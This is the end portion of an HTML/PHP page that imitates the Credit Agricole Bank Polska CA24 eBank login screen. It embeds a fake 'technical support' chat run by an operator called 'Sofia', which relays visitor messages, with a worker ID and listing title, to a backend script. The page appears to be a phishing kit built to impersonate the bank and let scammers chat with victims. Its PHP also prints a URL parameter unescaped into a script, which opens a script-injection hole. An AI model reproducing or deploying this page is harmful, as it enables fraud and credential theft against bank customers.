                              .chaport-container .chaport-launcher {
                                position: absolute;
                                display: block;
                                bottom: 0;
                                right: 0;
                                left: 0;
                                z-index: 2147483500;
                                width: auto;
                                height: 0;
                                overflow: visible;
                                font-size: 14px;
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
                                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                                opacity: 1;
                                transform: rotate(0deg);
                                width: 2.28571em;
                                height: 2.64286em;
                                position: absolute;
                                margin-top: 0.07143em;
                                top: 0.92857em;
                                left: 1em;
                                background-image: url(/chap.png);
                                background-repeat: no-repeat;
                                background-size: 100% 100%;
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button {
                                position: absolute;
                                bottom: 1.42857em;
                                right: 1.42857em;
                                width: 4.28571em;
                                height: 4.28571em;
                                -webkit-border-radius: 50%;
                                -moz-border-radius: 50%;
                                -ms-border-radius: 50%;
                                border-radius: 50%;
                                -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                cursor: pointer;
                                -webkit-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                -o-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
                                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                                opacity: 0;
                                transform: rotate(-45deg) scale(1);
                                position: absolute;
                                top: 0;
                                right: 0;
                                width: 4.28571em;
                                height: 4.28571em;
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
                                -ms-transform: rotate(45deg);
                                -webkit-transform: rotate(45deg);
                                transform: rotate(45deg);
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before,
                              .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
                                position: absolute;
                                top: 1.5em;
                                right: 2.07143em;
                                content: ' ';
                                height: 1.35714em;
                                width: 0.14286em;
                                background-color: #fff;
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
                                opacity: 0;
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
                                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                                opacity: 1;
                                transform: rotate(0deg);
                                position: absolute;
                                z-index: 1;
                                width: 100%;
                                height: 100%;
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
                                transform: scale(1);
                              }
                              
                              .chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
                                border-width: 0.33333em;
                                bottom: 1.13333em;
                                border-left-color: #fff;
                              }
                              
                              .chaport-container .chaport-window-anim.chaport-anim-hide {
                                transform: translateY(20px);
                              }
                              
                              .chaport-container.chaport-container-positioned .chaport-window {
                                position: absolute;
                                top: auto;
                                right: 20px;
                                bottom: 115px;
                                left: auto;
                                width: 300px;
                                -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                -webkit-border-radius: 8px;
                                -moz-border-radius: 8px;
                                -ms-border-radius: 8px;
                                border-radius: 8px;
                                overflow: hidden;
                                z-index: 2147483500;
                              }
                              
                              .chaport-container .chaport-window-anim {
                                transition: height 0s linear 0.3s, visibility 0s linear 0.3s, opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1), transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                              }
                              
                              .chaport-container .chaport-inner {
                                position: relative;
                                margin-left: 0px;
                                margin-right: 0px;
                                background-color: #fff;
                              }
                              
                              .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
                                position: absolute;
                                right: 0;
                                bottom: 60px;
                              }
                              
                              .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
                                position: absolute;
                                left: -41px;
                                bottom: 7px;
                              }
                              
                              .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
                                width: 100%;
                                height: 100%;
                                -webkit-border-radius: 50%;
                                -moz-border-radius: 50%;
                                -ms-border-radius: 50%;
                                border-radius: 50%;
                              }
                              
                              .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
                                margin-bottom: 5px;
                                font-size: 15px;
                                font-weight: bold;
                              }
                              
                              .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
                                font-size: 15px;
                              }
                              
                              @media (max-width: 339px),
                              (min-width: 341px) {
                                .chaport-close,
                                .chaport-container .chaport-close {
                                  display: block;
                                }
                              }
                              
                              .chaport-container .chaport-big-shadow {
                                opacity: 0;
                                z-index: 2147483499;
                                position: fixed;
                                width: 480px;
                                height: 480px;
                                bottom: 0;
                                right: 0;
                                content: "";
                                pointer-events: none;
                                background: radial-gradient(ellipse at bottom right, rgba(27, 37, 52, 0.15) 0, rgba(27, 37, 52, 0) 70%);
                                -webkit-transition: opacity 0.2s linear;
                                -o-transition: opacity 0.2s linear;
                                transition: opacity 0.2s linear;
                              }
                              
                              .chaport-content {
                                position: absolute;
                                top: 0;
                                right: 0;
                                bottom: 0;
                                left: 0;
                                overflow: hidden;
                                -webkit-border-top-left-radius: 8px;
                                -moz-border-top-left-radius: 8px;
                                -ms-border-top-left-radius: 8px;
                                border-top-left-radius: 8px;
                                -webkit-border-top-right-radius: 8px;
                                -moz-border-top-right-radius: 8px;
                                -ms-border-top-right-radius: 8px;
                                border-top-right-radius: 8px;
                                display: flex;
                                flex-direction: column;
                                justify-content: space-between;
                              }
                              
                              @media (max-width: 460px),
                              (max-width: 750px) and (orientation: landscape) .chaport-content {
                                -webkit-border-radius: 0;
                                -moz-border-radius: 0;
                                -ms-border-radius: 0;
                                border-radius: 0;
                              }
                              
                              .chaport-close,
                              .chaport-container .chaport-close {
                                position: absolute;
                                top: 0;
                                right: 0;
                                z-index: 4;
                                width: 50px;
                                height: 41px;
                                cursor: pointer;
                                opacity: 0.6;
                                -webkit-transition: opacity 0.2s linear;
                                -o-transition: opacity 0.2s linear;
                                transition: opacity 0.2s linear;
                                display: none;
                              }
                              
                              .main-textblock {
                                background-color: #ffffff;
                                border-radius: 4px;
                                height: 500px;
                              }
                              
                              .operatorblock {
                                height: 130px;
                                background-color: #007e90;
                                top: 0;
                              }
                              
                              #operator-photo {
                                width: 60px;
                                height: 60px;
                                margin-bottom: 7px;
                                text-align: center;
                                margin-top: 8px;
                              }
                              
                              #oper-photo-img {
                                width: 100%;
                                height: 100%;
                                border-radius: 50%;
                              }
                              
                              .operatorblock-content {
                                padding: 20px;
                                display: flex;
                              }
                              
                              .operator-name {
                                font-size: 13px;
                                color: rgba(255, 255, 255, 0.7);
                              }
                              
                              .team-wrapper {
                                text-align: center;
                                width: 60%;
                                margin-top: 30px;
                                margin-left: 4%;
                              }
                              
                              .team {
                                font-size: 16px;
                                color: #fff;
                              }
                              
                              .activity-indicator {
                                font-size: 13px;
                                color: rgba(255, 255, 255, 0.7);
                              }
                              
                              .with-status {
                                padding-left: 15px;
                                display: inline-block;
                                position: relative;
                              }
                              
                              .status-online {
                                display: block;
                                background-color: #4fd237;
                                position: absolute;
                                right: -3px;
                                bottom: 3px;
                                width: 7px;
                                height: 7px;
                                background-repeat: no-repeat;
                                border-radius: 7px;
                                border-width: 1px;
                                border-style: solid;
                                box-sizing: content-box;
                                left: 0;
                                right: auto;
                                border-color: #4fd237;
                              }
                              
                              #input-msg {
                                border-top: 1px solid #babac05c;
                                width: 100%;
                                position: absolute;
                                bottom: 0;
                                height: 50px;
                                margin-bottom: 20px;
                              }
                              
                              #smstosup1 {
                                margin-left: 10px;
                                width: 100%;
                                border: none;
                                font-size: 15px;
                              }
                              
                              .chaport-container .chaport-input-wrapper .chaport-send-icon,
                              .chaport-input-wrapper .chaport-send-icon {
                                opacity: 1;
                                transform: scale(1);
                                position: absolute;
                                bottom: 15px;
                                left: 7px;
                                width: 18px;
                                height: 18px;
                                transition: opacity 0.2s linear, transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
                              }
                              
                              .chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon,
                              .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
                                fill: #414141;
                                transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
                              }
                              
                              #smstosupbutton1 {
                                border-width: 0px;
                                background: #fff;
                                margin-right: 10px;
                              }
                              
                              #smstosupbutton1 {
                                cursor: pointer;
                              }
                              
                              #smstosupbutton1:focus,
                              #smstosupbutton1:active {
                                outline: none;
                              }
                              
                              .chaport-window {
                                visibility: hidden;
                                opacity: 0;
                              }
                              
                              .chat-block {
                                overflow-y: auto;
                                height: 300px;
                                overflow-x: hidden;
                              }
                              
                              #chat {
                                padding-bottom: 15px;
                              }
                              
                              .operators-msg {
                                margin-top: 15px;
                              }
                              
                              .operators-first-text {
                                padding: 10px;
                                width: 180px;
                                border-radius: 8px;
                                background-color: #e8ecef;
                                padding-right: 30px;
                              }
                              
                              .operators-msg-text {
                                padding: 10px;
                                max-width: 180px;
                                border-radius: 8px;
                                background-color: #e8ecef;
                                padding-right: 30px;
                              }
                              
                              .visitors-msg-text {
                                margin-top: 15px;
                                margin-right: 10px;
                                margin-left: 80px;
                                padding: 10px;
                                min-width: 180px;
                                border-radius: 8px;
                                background-color: #007e90;
                                color: #fff;
                              }
                              
                              .operators-photo img {
                                width: 30px;
                                height: 30px;
                                border-radius: 50%;
                                margin-left: 5px;
                                margin-right: 5px;
                              }
                              
                              .chat-block::-webkit-scrollbar {
                                width: 7px;
                              }
                              
                              .chat-block::-webkit-scrollbar-button {
                                display: none;
                              }
                              
                              .chat-block::-webkit-scrollbar-thumb {
                                border-radius: 8px;
                                background-color: #babac0;
                                border: 1px solid transparent;
                              }
                              
                              .chat-block::-webkit-scrollbar-thumb {
                                border-radius: 8px;
                                background-color: #babac0;
                                border: 1px solid transparent;
                              }
                            </style>
                            <div id="offonthechap">
                              <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                                  <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                                    <div class="chaport-launcher-chat-icon"></div>
                                    <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                                    <div class="chaport-launcher-close-icon"></div>
                                    <div class="chaport-launcher-operator-photo"></div>
                                  </div>
                                </div>
                                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                                  <div class="chaport-inner">
                                    <div class="main-textblock">
                                      <div class="operatorblock">
                                        <div class="operatorblock-content" style="display: flex;">
                                          <div id="operator-photo"> <img id="oper-photo-img" src="./agricole_files/operator-img.png">
                                            <div class="operator-name">Sofia</div>
                                          </div>
                                          <div class="team-wrapper">
                                            <div class="team">Pomoc techniczna</div>
                                            <div class="activity-indicator">
                                              <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;"> </div>online</div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                      <div class="chat-block">
                                        <div id="chat">
                                          <div class="operators-msg" id="greeting-msg" style="display: none;">
                                            <div class="operators-photo"><img src="./agricole_files/operator-img.png"></div>
                                            <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>
                                          </div>
                                        </div>
                                        <div id="input-msg" style="display: flex;">
                                          <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                          <button id="smstosupbutton1" onclick="sendMessage()">
                                            <div class="chaport-send-icon">
                                              <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf"> </polygon>
                                              </svg>
                                            </div>
                                          </button>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div class="chaport-big-shadow"></div>
                              </div>
                            </div>
                            <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
                          </div>
                        </app-login-form-user>
                      </div>
                      <div class="col-12 col-md-6 ng-tns-c168-4 md-sticky-bottom-container ng-star-inserted" style="align-self: auto;">
                        <app-login-note-alert class="ng-tns-c168-4 ng-star-inserted">
                          <div class="note-alert card ng-star-inserted">
                            <div role="complementary" class="alert alert-warning card-inner">
                              <h2 class="caption"><span>UWAGA</span></h2>
                              <div>
                                <h5><strong>Zamykamy starą wersję serwisu internetowego CA24 eBank</strong></h5>
                                <p>
                                  <br>16 listopada 2021 roku zamkniemy ostatecznie poprzednią wersję serwisu internetowego CA24 eBank. Od tego dnia dostępna będzie tylko nowsza wersja serwisu, którą wdrożyliśmy dwa lata temu. Zaprojektowaliśmy ją&nbsp;z myślą o Państwa wygodzie - naszych klientach indywidualnych i firmowych.&nbsp;</p>
                                <p>&nbsp;</p>
                                <p>
                                  <br>Więcej informacji <a href="https://www.credit-agricole.pl/o-banku/aktualnosci/2021/zamykamy-stara-wersje-serwisu-internetowego" target="_blank" rel="noopener">tutaj</a></p>
                              </div>
                            </div>
                          </div>
                        </app-login-note-alert>
                      </div>
                      <div class="col-12 col-md-6 md-strech ng-tns-c168-4 ng-star-inserted">
                        <app-login-security-info class="ng-tns-c168-4">
                          <div class="security-info-container card-inner clearfix h-100 ng-star-inserted">
                            <div>
                              <h5><a href="https://www.credit-agricole.pl/o-banku/aktualnosci/2021/ostrzezenie-oszusci-podaja-sie-za-pracownikow-banku" target="_blank" rel="noopener"><strong>Aktualne ostrzeżenie: oszuści podają się za pracowników banku</strong></a></h5>
                              <p>&nbsp;</p>
                              <h5>Kiedy korzystasz z bankowości internetowej, przestrzegaj kilku ważnych zasad:</h5>
                              <ul>
                                <li><strong>zanim się zalogujesz sprawdź:</strong></li>
                              </ul>
                              <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy w pasku jest prawidłowy adres: https://ca24.credit-agricole.pl,
                                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy przed adresem jest symbol kłódki,
                                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy certyfikat serwisu jest prawidłowy (taki jak opisujemy w sekcji <a href="https://www.credit-agricole.pl/bezpieczenstwo/korzystanie-z-nowego-serwisu-internetowego-ca24" target="_blank" rel="noopener">Bezpieczeństwo</a>),
                                <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy po lewej stronie ekranu z hasłem wyświetla się Twój obrazek bezpieczeństwa;</p>
                              <ul>
                                <li>&nbsp;nie korzystaj z linków do logowania otrzymanych w SMS-ach i e-mailach;</li>
                                <li>&nbsp;zawsze samodzielnie wpisuj adres CA24 eBank. Możesz zapisać ten adres w „ulubionych” w przeglądarce lub przechodzić do serwisu ze strony głównej banku;</li>
                                <li>&nbsp;jeżeli cokolwiek budzi Twoje wątpliwości, gdy się logujesz lub autoryzujesz transakcję – przerwij operację, nie wprowadzaj danych i skontaktuj się z nami jak najszybciej.</li>
                              </ul>
                              <p class="left"><a href="https://www.credit-agricole.pl/bezpieczenstwo" target="_blank" rel="noopener">Dowiedz się więcej o bezpieczeństwie</a></p>
                            </div>
                          </div>
                        </app-login-security-info>
                      </div>
                    </div>
                  </div>
                </app-login-screen>
              </div>
            </app-login>
          </div>
        </div>
        <app-footer class="ng-star-inserted">
          <footer>
            <div class="site-width footer-width">
              <div class="container-fluid">
                <div class="row footer-elements">
                  <div class="col-12 col-lg-8 menu-element">
                    <div>
                      <div class="footer-menu">
                        <div class="logo"></div>
                        <ul class="nav">
                          <li><a href="javascript:void(0);"><span>Bezpieczeństwo</span></a></li>
                          <li><a href="javascript:void(0);"><span>Polityka Cookies</span></a></li>
                          <li><a href="javascript:void(0);"><span>Placówki i bankomaty</span></a></li>
                          <li><a href="javascript:void(0);"><span>Koszt przewalutowania</span></a></li>
                          <li><a href="javascript:void(0);"><span>Dokumenty</span></a></li>
                          <li><a href="javascript:void(0);"><span>Opłaty i prowizje</span></a></li>
                          <li><a href="javascript:void(0);"><span>Oprocentowanie</span></a></li>
                          <li><a href="javascript:void(0);"><span>Kursy walut</span></a></li>
                          <li><a href="javascript:void(0);"><span>Notowania funduszy</span></a></li>
                        </ul>
                      </div>
                      <div class="footer-copyright">
                        <p class="copyright"> © 2019 Credit Agricole Bank Polska S.A.
                          <br class="d-md-none"> Wszelkie prawa zastrzeżone. </p>
                      </div>
                    </div>
                    <div class="footer-buttons">
                      <div id="set-language" class="dropdown">
                        <button type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" class="btn btn-default dropdown-toggle"><i class="flag flag-pl"></i><span>Język polski</span></button>
                        <div aria-labelledby="dropdownMenuButton" class="dropdown-menu"><a class="dropdown-item ng-star-inserted" style="cursor: pointer;"><i class="flag flag-pl"></i><span>Język polski</span></a><a class="dropdown-item ng-star-inserted" style="cursor: pointer;"><i class="flag flag-en"></i><span>English</span></a><a class="dropdown-item ng-star-inserted" style="cursor: pointer;"><i class="flag flag-fr"></i><span>Français</span></a><a class="dropdown-item ng-star-inserted" style="cursor: pointer;"><i class="flag flag-uk"></i><span>Українська</span></a> </div>
                      </div><span id="set-contrast" class="footer-button form-inline"><button class="btn btn-default set-hicontrast"><span class="ca ca-contrast"></span> Wybierz wersję kontrastową </button>
                      <button class="btn btn-default set-default"><span class="ca ca-contrast"></span> Wybierz wersję zwykłą </button>
                      </span>
                    </div>
                  </div>
                  <div class="col-12 col-lg-4 contact-element">
                    <div class="row no-gutters">
                      <div class="col-12 col-md-6 col-lg-12">
                        <p class="infoline"><i class="ca ca-infoline"></i> Serwis telefoniczny:
                          <br><span class="number"><a href="tel:19 019" title="19 019">19 019</a></span></p>
                      </div>
                      <div class="col-12 col-md-6 col-lg-12">
                        <p class="phone"><i class="ca ca-device"></i> dla połączeń zagranicznych:
                          <br><span class="number"><a href="tel:+48 71 35 49 009" title="+48 71 35 49 009">+48 71 35 49 009</a></span></p>
                        <p class="appointment ng-star-inserted"><a href="javascript:void(0);"><i class="ca ca-chat"></i><span>Czat</span></a></p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </footer>
        </app-footer>
      </div>
    </app-root>
  

</body></html>